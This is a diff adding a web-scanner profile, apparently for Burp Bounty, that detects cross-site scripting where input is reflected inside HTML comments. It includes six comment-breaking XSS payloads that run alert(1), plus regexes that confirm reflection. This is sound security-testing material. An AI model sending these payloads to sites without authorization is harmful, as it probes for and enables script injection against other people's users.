@@ -1,0 +1,96 @@
+[
+  {
+    "profile_name": "XSS_HTML_Comment_Context",
+    "enabled": true,
+    "scanner": "active",
+    "author": "@bountysecurity",
+    "steps": [
+      {
+        "request_type": "original",
+        "reuse_cookie": false,
+        "insertion_point": "same",
+        "raw_request": "",
+        "payloads": [
+          "true,comment_xsstest1337"
+        ],
+        "payloads_file": "",
+        "payload_position": "replace",
+        "change_http_request": false,
+        "change_http_request_type": "post_to_get",
+        "insertion_points": [
+          "param_body",
+          "user_provided",
+          "param_url"
+        ],
+        "header_value": false,
+        "new_headers": [],
+        "match_replace": [],
+        "encoder": [],
+        "url_encode": false,
+        "chars_to_url_encode": "",
+        "greps_file": "",
+        "grep": [
+          "true,,Regex,,<!--[\\s\\S]*?comment_xsstest1337[\\s\\S]*?-->",
+          "true,AND,Content Type,,text/html"
+        ],
+        "redir_type": "on_site",
+        "max_redir": 3,
+        "show_alert": "none",
+        "issue_name": "HTML_Comment_Detection",
+        "issue_severity": "Information",
+        "issue_confidence": "Firm",
+        "issue_detail": "Preliminary detection of reflection within HTML comments",
+        "remediation_detail": "",
+        "issue_background": "",
+        "remediation_background": ""
+      },
+      {
+        "request_type": "original",
+        "reuse_cookie": false,
+        "insertion_point": "same",
+        "raw_request": "",
+        "payloads": [
+          "true,--><script>alert(1)</script><!--",
+          "true,--><img src=x onerror=alert(1)><!--",
+          "true,--!><script>alert(1)</script><!--",
+          "true,--></script><script>alert(1)</script><!--",
+          "true,--!></script><script>alert(1)</script><!--",
+          "true,--><svg onload=alert(1)><!--"
+        ],
+        "payloads_file": "",
+        "payload_position": "replace",
+        "change_http_request": false,
+        "change_http_request_type": "post_to_get",
+        "insertion_points": [],
+        "header_value": false,
+        "new_headers": [],
+        "match_replace": [],
+        "encoder": [],
+        "url_encode": false,
+        "chars_to_url_encode": "",
+        "greps_file": "",
+        "grep": [
+          "true,,Regex,,-->[^<]*<script>alert\\(1\\)</script>",
+          "true,OR,Regex,,-->[^<]*<img src\\s*=\\s*x\\s+onerror\\s*=\\s*alert\\(1\\)>",
+          "true,OR,Regex,,-->[^<]*<svg onload\\s*=\\s*alert\\(1\\)>",
+          "true,AND,Content Type,,text/html"
+        ],
+        "redir_type": "on_site",
+        "max_redir": 3,
+        "show_alert": "always",
+        "issue_name": "HTML_Comment_XSS",
+        "issue_severity": "Medium",
+        "issue_confidence": "Certain",
+        "issue_detail": "User input is inserted within an HTML comment without proper sanitization, allowing the comment to be closed and JavaScript code to be executed.",
+        "remediation_detail": "Validate and sanitize user input before including it in HTML comments. Consider not including user data inside HTML comments.",
+        "issue_background": "",
+        "remediation_background": ""
+      }
+    ],
+    "Tags": [
+      "XSS",
+      "HTML_Comment",
+      "All"
+    ]
+  }
+]
